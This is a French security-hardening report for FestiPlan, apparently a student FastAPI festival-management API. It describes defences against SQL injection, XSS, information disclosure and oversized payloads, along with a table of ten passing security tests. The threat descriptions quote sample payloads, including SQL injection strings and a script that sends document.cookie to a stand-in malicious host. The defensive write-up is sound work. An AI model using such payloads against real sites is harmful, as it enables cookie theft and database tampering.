# Dossier d'Ingénierie Cybersécurité & Hardening — FestiPlan

**Projet :** FestiPlan — API de Gestion de Festival  
**Contexte :** Renforcement de la sécurité applicative (Sécurité en Profondeur dans l'Architecture Hexagonale)  
**Branche Git :** `feat/security-hardening`  
**Référence des menaces :** OWASP Top 10 API Security Risks

---

## 1. Pourquoi la Cybersécurité dans FestiPlan ?

Bien que le sujet initial se focalise sur l'architecture hexagonale et DDD, **une application d'entreprise ne peut pas dissocier qualité architecturale et sécurité**.

Dans l'état initial (legacy), plusieurs faiblesses techniques laissaient entrevoir des risques majeurs :
1. **Absence totale d'en-têtes HTTP de sécurité :** Vulnérabilité au Clickjacking (`X-Frame-Options` absent) et au MIME-type sniffing (`X-Content-Type-Options` absent).
2. **Risque de Stored XSS (Cross-Site Scripting) :** Aucune neutralisation des balises `<script>` ou handlers d'événements JavaScript (`onerror=`, `onload=`) dans les champs textuels libres (descriptions d'incidents, noms d'artistes, scènes). Un pirate pouvait injecter un script qui s'exécuterait dans le navigateur des organisateurs consultant le planning.
3. **Risque de fuite d'informations (Information Disclosure) :** En cas d'exception non gérée (erreur 500), le serveur pouvait renvoyer une stack trace complète exposant les chemins système de la machine hôte (`C:\Users\...`), les requêtes SQL et la structure interne de la base de données SQLite.
4. **Risque de déni de service par saturation (DoS applicatif) :** Absence de garde-fous sur la taille maximale de certains flux de données.

---

## 2. Articulation de la Sécurité dans l'Architecture Hexagonale

Dans notre architecture, la cybersécurité n'est pas reléguée dans un coin isolé : elle applique le principe de **Défense en Profondeur** à chaque frontière hexagonale :

```mermaid
flowchart TD
    subgraph Primary_Adapters ["1. Adaptateurs Entrants (Driving Adapters)"]
        H["SecurityHeadersMiddleware<br><i>OWASP Headers: CSP, X-Frame-Options, HSTS, nosniff</i>"]
        C["CORSMiddleware<br><i>Contrôle strict des origines et méthodes autorisées</i>"]
        EH["global_security_exception_handler<br><i>Masquage des stack traces & logs sécurisés internes</i>"]
    end

    subgraph Input_Validation ["2. Validation & Assainissement (DTOs)"]
        P["Pydantic Schemas<br><i>Typage strict, bornage des longueurs (max_length)</i>"]
        S["InputSanitizer<br><i>Élimination des balises &lt;script&gt; et échappement HTML</i>"]
    end

    subgraph Domain_Core ["3. Cœur de Domaine DDD"]
        I["Invariants Métier<br><i>Vérification des règles R1 à R10 (données non vides, créneaux valides)</i>"]
    end

    subgraph Secondary_Adapters ["4. Adaptateurs Sortants (Driven Adapters)"]
        ORM["SQLAlchemy ORM Repositories<br><i>Requêtes 100% paramétrées (Protection Anti-SQLi)</i>"]
    end

    Primary_Adapters --> Input_Validation
    Input_Validation --> Domain_Core
    Domain_Core --> Secondary_Adapters
```

### Organisation des Fichiers dans le Projet
* `app/adapters/primary/security/security_headers.py` : Middleware d'en-têtes HTTP de sécurité.
* `app/adapters/primary/security/sanitizer.py` : Composant `InputSanitizer` de neutralisation XSS.
* `app/adapters/primary/security/error_handler.py` : Intercepteur global d'erreurs pour bloquer toute fuite d'informations techniques.
* `tests/security/test_security_hardening.py` : Suite de 10 tests de sécurité automatisés.

---

## 3. Détail des Risques Traités & Solutions Apportées

### 3.1 Protection contre les Injections SQL (OWASP A03 — Injection)
* **Menace :** Injection de requêtes arbitraires (`' OR 1=1 --`, `UNION SELECT`, `DROP TABLE festivals;--`) visant à altérer ou exfiltrer la base de données.
* **Remédiation Hexagonale :**
  1. *Au niveau des DTOs et des Routes :* Tous les paramètres numériques (`festival_id`, `concert_id`) sont strictement typés en `int`. Toute tentative d'injection dans les URLs est bloquée dès l'entrée avec un code **HTTP 422**.
  2. *Au niveau des Repositories Secondaires :* Aucune requête SQL n'est construite par concaténation de chaînes brutes (`f"SELECT ..."`). L'ORM SQLAlchemy utilise exclusivement des requêtes paramétrées avec substitution sécurisée des variables.
* **Preuve par les tests :** Les tests injectent `' OR '1'='1` et `DROP TABLE` dans les paramètres et les corps JSON. Les requêtes sont traitées comme du texte littéral inoffensif sans jamais corrompre la base de données.

---

### 3.2 Protection contre les Injections XSS (Cross-Site Scripting)
* **Menace :** Soumission d'une description d'incident contenant `<script>fetch('http://malicious.com/?stolen=' + document.cookie)</script>` ou `<img src=x onerror=malicious()>`.
* **Remédiation Hexagonale :**
  * Création du composant [`InputSanitizer`](file:///c:/Users/hugoc/Ynov/Year3/ArchitectureHexagonale/festiplan/festiplan/app/adapters/primary/security/sanitizer.py).
  * Intégration via des `field_validator` Pydantic sur les schémas d'entrée ([`app/schemas.py`](file:///c:/Users/hugoc/Ynov/Year3/ArchitectureHexagonale/festiplan/festiplan/app/schemas.py)).
  * Les balises `<script>` sont automatiquement éradiquées et les caractères spéciaux (`<`, `>`, `"`, `'`, `&`) sont convertis en entités HTML inoffensives (`&lt;`, `&gt;`).
* **Preuve par les tests :** L'enregistrement d'une description avec payload malveillant conserve le texte légitime mais neutralise toute balise exécutable.

---

### 3.3 Prévention des Fuites d'Informations (OWASP A05 — Information Disclosure)
* **Menace :** Lors d'une panne imprévue (panne SQLite, erreur réseau, bug inattendu), FastAPI et Starlette peuvent renvoyer la stack trace brute au client HTTP, révélant les chemins de disques locaux (`C:\Users\hugoc\...`), les noms de tables et le schéma interne.
* **Remédiation Hexagonale :**
  * Création du gestionnaire [`global_security_exception_handler`](file:///c:/Users/hugoc/Ynov/Year3/ArchitectureHexagonale/festiplan/festiplan/app/adapters/primary/security/error_handler.py).
  * Les erreurs HTTP prévues (400, 404, 422) sont préservées pour les retours métier.
  * Toute exception inattendue est captée, logguée de manière confidentielle côté serveur avec son contexte complet, et le client reçoit une réponse générique **HTTP 500** ne contenant aucun détail sensible.
* **Preuve par les tests :** Un crash serveur provoquant une fuite d'informations simulée renvoie une réponse JSON 500 anonymisée sans aucune trace de `C:\Users` ou de structure de base.

---

### 3.4 En-têtes HTTP de Sécurité (OWASP Security Headers)
* **Menace :** Clickjacking, écoute de trafic et attaques MIME Sniffing.
* **Remédiation Hexagonale :**
  * Le middleware [`SecurityHeadersMiddleware`](file:///c:/Users/hugoc/Ynov/Year3/ArchitectureHexagonale/festiplan/festiplan/app/adapters/primary/security/security_headers.py) injecte sur **toutes les réponses HTTP** :
    * `X-Content-Type-Options: nosniff`
    * `X-Frame-Options: DENY`
    * `X-XSS-Protection: 1; mode=block`
    * `Referrer-Policy: strict-origin-when-cross-origin`
    * `Permissions-Policy: geolocation=(), microphone=(), camera=()`
    * `Content-Security-Policy: default-src 'self'; frame-ancestors 'none'; ...` (configuré pour autoriser l'affichage propre de Swagger UI tout en protégeant l'application).
* **Preuve par les tests :** Vérification systématique de la présence et de la conformité des en-têtes sur les endpoints de l'API.

---

### 3.5 Protection Anti-DoS par Dépassement de Capacité
* **Menace :** Saturation de la mémoire ou du disque par injection de descriptions textuelles de plusieurs dizaines de mégaoctets.
* **Remédiation :**
  * Bornage strict `max_length=2000` sur les descriptions d'incidents et `max_length=120` sur les noms et villes.
* **Preuve par les tests :** Rejet immédiat avec code **HTTP 422** dès qu'une charge excessive est détectée.

---

## 4. Bilan de la Suite de Tests de Sécurité

La suite dédiée [`tests/security/test_security_hardening.py`](file:///c:/Users/hugoc/Ynov/Year3/ArchitectureHexagonale/festiplan/festiplan/tests/security/test_security_hardening.py) comprend **10 tests automatisés** :

| # | Test | Objectif de sécurité | Résultat |
| :---: | :--- | :--- | :---: |
| 1 | `test_security_headers_present_on_endpoints` | Présence des en-têtes OWASP (`nosniff`, `DENY`, CSP). | **PASSED** |
| 2 | `test_sqli_in_query_parameters_fails_safe[1 OR 1=1]` | Typage strict anti-SQLi dans les query params. | **PASSED** |
| 3 | `test_sqli_in_query_parameters_fails_safe[1' OR '1'='1]` | Typage strict anti-SQLi dans les query params. | **PASSED** |
| 4 | `test_sqli_in_query_parameters_fails_safe[DROP TABLE]` | Typage strict anti-SQLi dans les query params. | **PASSED** |
| 5 | `test_sqli_in_query_parameters_fails_safe[UNION SELECT]` | Typage strict anti-SQLi dans les query params. | **PASSED** |
| 6 | `test_sqli_payload_in_text_body_is_safely_parameterized` | Paramétrage sécurisé des champs textuels SQL. | **PASSED** |
| 7 | `test_input_sanitizer_unit` | Test unitaire de neutralisation des balises HTML et scripts. | **PASSED** |
| 8 | `test_xss_injection_in_incident_description_is_sanitized` | Élimination des scripts XSS dans les descriptions d'incidents. | **PASSED** |
| 9 | `test_oversized_payload_rejected` | Rejet HTTP 422 des charges surdimensionnées (Anti-DoS). | **PASSED** |
| 10 | `test_unhandled_exception_does_not_leak_system_paths` | Masquage des chemins système et stack traces lors d'un crash 500. | **PASSED** |

**Total général de la suite FestiPlan :** **83 tests automatisés**, tous réussis en **1.77 seconde**.
